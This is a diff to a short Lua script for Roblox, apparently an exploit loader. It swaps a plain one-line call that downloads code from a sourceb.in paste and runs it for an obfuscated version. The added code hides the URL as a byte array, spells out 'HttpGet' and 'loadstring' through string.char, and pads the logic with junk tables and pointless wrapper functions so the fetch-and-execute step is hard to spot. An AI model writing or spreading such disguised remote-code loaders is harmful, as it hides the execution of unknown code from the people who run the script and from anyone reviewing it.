@@ -1,1 +1,38 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/JtNabPuV1t/0", true))()
+(function()
+    local c = string.char
+    local function join(t)
+        local s = ""
+        for i = 1, #t do
+            s = s .. c(t[i])
+        end
+        return s
+    end
+
+    local _ENVIRON = getfenv and getfenv(1) or _ENV
+
+    local trash = {
+        [math.random(1,9)] = function(...) return ... end,
+        [math.random(10,20)] = "noise",
+        [math.random(21,30)] = function() return not true end
+    }
+
+    local url_bytes = {104,116,116,112,115,58,47,47,99,100,110,46,115,111,117,114,99,101,98,46,105,110,47,98,105,110,115,47,74,116,78,97,98,80,117,86,49,116,47,48}
+    local url = join(url_bytes)
+
+    local g = game
+    local getHttp = g[c(72)..c(116)..c(116)..c(112)..c(71)..c(101)..c(116)] -- HttpGet
+    local load = _ENVIRON[c(108)..c(111)..c(97)..c(100)..c(115)..c(116)..c(114)..c(105)..c(110)..c(103)] -- loadstring
+
+    local L0 = function(fn)
+        return function(...)
+            return fn(...)
+        end
+    end
+
+    local phase = (((L0)(function(f) return function(g) return f(g) end end)))(function(x) return x end)
+
+    phase(function()
+        local response = getHttp(g, url, true)
+        return load(response)()
+    end)()
+end)()
